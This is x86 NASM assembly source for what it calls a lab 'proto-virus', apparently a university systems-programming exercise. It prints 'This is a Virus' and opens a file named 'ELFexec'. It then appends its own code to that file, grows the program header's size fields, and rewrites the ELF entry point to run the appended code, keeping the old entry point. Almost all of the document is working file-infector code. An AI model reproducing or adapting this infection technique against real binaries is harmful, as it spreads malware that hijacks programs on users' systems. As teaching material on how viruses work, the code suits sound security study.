%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro  getLocToEcx 1
	call get_my_loc
	sub ecx, next_i - %1
%endmacro

%define	STK_RES	200
%define	STDOUT	1
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define FileDec [ebp-4]
%define Buffer [ebp-200]
%define FileLength [ebp-8]
%define HeaderAndProgramSize [ebp-16]
%define oldEntry [ebp-20]

%define ELF_HeaderSizeBack 52
%define ELF_HeaderSize 40
%define ELF_ProgramSize 0x2A
%define	ELF_memsizeOffsetFromEnd	12
%define	ELF_vaddrFromEnd	24
%define	ELF_filesizeOffsetFromEnd	16
%define	ELF_programHeaderOffsetFromEnd	28
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


code_start:
	getLocToEcx WelcomeMessage
	write STDOUT , ecx , WelcomeMessageLen


	getLocToEcx FileName
	mov ebx, ecx
	open ebx, RDWR,0777
	cmp eax, 0
	jl FileOpenError
	mov FileDec, dword eax
	;;;;;;;Read Length of header;;;;;;;
		;;;;Size of this header in edi;;;;;
	lseek dword FileDec, ELF_HeaderSize , SEEK_SET
	lea ecx, HeaderAndProgramSize
	read dword FileDec, ecx, 2	
	mov edi, HeaderAndProgramSize
		;;;;Size of program header in esi;;;;
	mov dword HeaderAndProgramSize, 0
	lea ecx, HeaderAndProgramSize
	read dword FileDec, ecx, 2	
	mov esi, HeaderAndProgramSize

		;;;;Number of program header in eax;;;;
	mov dword HeaderAndProgramSize, 0
	lea ecx, HeaderAndProgramSize
	read dword FileDec, ecx, 2	
	lseek dword FileDec, 0 , SEEK_SET
	mov eax, HeaderAndProgramSize
	
	mul esi

	mov dword HeaderAndProgramSize, 0
	mov dword HeaderAndProgramSize, eax
	
	add HeaderAndProgramSize, edi
	;;;;;;Read header;;;;;;;
	; mov dword HeaderAndProgramSize,150
	mov ecx,0
	lea ecx, Buffer
	read dword FileDec, ecx, dword HeaderAndProgramSize
	
	cmp byte [ecx], 7fh
	jne NotElf
	inc ecx
	cmp byte [ecx], 'E'
	jne NotElf
	inc ecx
	cmp byte [ecx], 'L'
	jne NotElf
	inc ecx
	cmp byte [ecx], 'F'
	jne NotElf

	lseek dword FileDec, 0 , SEEK_SET
	lseek dword FileDec, 0 , SEEK_END
	mov dword FileLength , eax
	;;;;;;;;;Copy Code To End Of File;;;;;;;;;
	getLocToEcx _start
	write dword FileDec, ecx, virus_end - _start


	;;;;;;;;;Program header change;;;;;;;;;
	xor ebx,ebx
	xor edi, edi
	mov ebx,HeaderAndProgramSize
	sub ebx,ELF_programHeaderOffsetFromEnd ; ebx store the offset to memsize
	lea ebx, [ebx + ebp -200] ; ebx sotre the address of memsize
	mov edi, 0 ; edi has the program offset

	
	mov ebx,HeaderAndProgramSize
	sub ebx,ELF_memsizeOffsetFromEnd ; ebx store the offset to memsize
	lea ebx, [ebx + ebp -200] ; ebx sotre the address of memsize
	add dword [ebx], virus_end - _start
	sub [ebx], edi

	xor ebx,ebx
	mov ebx,HeaderAndProgramSize
	sub ebx,ELF_filesizeOffsetFromEnd ; ebx store the offset to filesize
	lea ebx, [ebx + ebp -200] ;ebx sotre the address of filesize
	add dword [ebx], virus_end - _start
	sub [ebx], edi
	
	;;;;;;;;;Change entry address;;;;;;;;;		
	xor edi, edi
	mov edi,HeaderAndProgramSize
	sub edi,ELF_programHeaderOffsetFromEnd ; edi store the offset to program header
	mov edi, [edi + ebp -200] ; ebx sotre the value of the offset

	xor ebx, ebx
	mov ebx,HeaderAndProgramSize
	sub ebx,ELF_vaddrFromEnd ; ebx store the offset to vaddr
	mov ebx, [ebx + ebp -200] ; ebx sotre the address of vaddr
	sub ebx, edi ; reduce the offset
	

	;mov ebx, [ebp-200 + PHDR_start] ; load offset of program section
	;mov ebx, [ebp-200 + ebx + PHDR_vaddr] ; base virtual address(08048000h)
	
	add ebx, dword FileLength
	mov edi, [ebp - 200 + ENTRY]
	mov oldEntry, edi
	mov [ebp - 200 + ENTRY], ebx

	lseek dword FileDec, 0 , SEEK_SET
	lea ecx, Buffer
	write dword FileDec, ecx, HeaderAndProgramSize

	lseek dword FileDec, -4 , SEEK_END

	lea ecx, oldEntry
	write dword FileDec, ecx, 4
	
	close FileDec
	
	mov edx, 0


; You code for this lab goes here

VirusExit:
       exit edx            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
FileOpenError:
	getLocToEcx PreviousEntryPoint
	mov edx, -1
	jmp [ecx]

NotElf:
		getLocToEcx ELFErrorMessage
		write STDOUT , ecx , ELFErrorMessage
		exit -1
					
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

WelcomeMessage: 	db "This is a Virus", 10, 0
WelcomeMessageLen: equ $ - WelcomeMessage 

OpenErrorMessage: 	db "Failed open file.", 10, 0
OpenErrorMessageLen: equ $ - OpenErrorMessage

ELFErrorMessage: 	db "Specified file is not ELF file", 10, 0
ELFErrorMessageLen: equ $ - ELFErrorMessage

get_my_loc:
		call next_i
		
next_i:
		pop ecx
		ret
	
PreviousEntryPoint: dd VirusExit
virus_end:



